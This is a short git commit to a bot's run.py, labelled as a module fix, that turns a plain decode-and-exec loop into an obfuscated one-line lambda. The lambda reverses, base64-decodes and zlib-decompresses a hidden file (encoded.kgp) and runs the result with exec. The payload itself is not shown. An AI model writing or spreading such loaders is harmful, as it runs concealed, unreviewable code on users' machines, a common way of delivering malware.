34d7601bd85414c0efb25c70d2769f85ff2b0d89
boytegar <boytegar@live.com>
2024-06-22 09:50:40 +0700

    fix error module bot

--- run.py
+++ run.py
@@ -1,21 +1,5 @@
-import base64
-import zlib
-import json
+_ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1])); 
 
-def decode_file(encoded_content):
-    # Balik urutan string dan decode dari base64
-    compressed_content = base64.b64decode(encoded_content[::-1])
-
-    # Dekompresi data
-    original_content = zlib.decompress(compressed_content).decode()
-
-    return original_content
-
-# Baca file terenkripsi dari file
-with open('encoded_files.json', 'r') as file:
-    encoded_files = json.load(file)
-
-# Dekripsi dan eksekusi setiap file
-for file_path, encoded_content in encoded_files.items():
-    original_content = decode_file(encoded_content)
-    exec(original_content)
+with open('encoded.kgp', 'r') as file:
+    encoded_code = file.read()
+exec((_) (encoded_code))
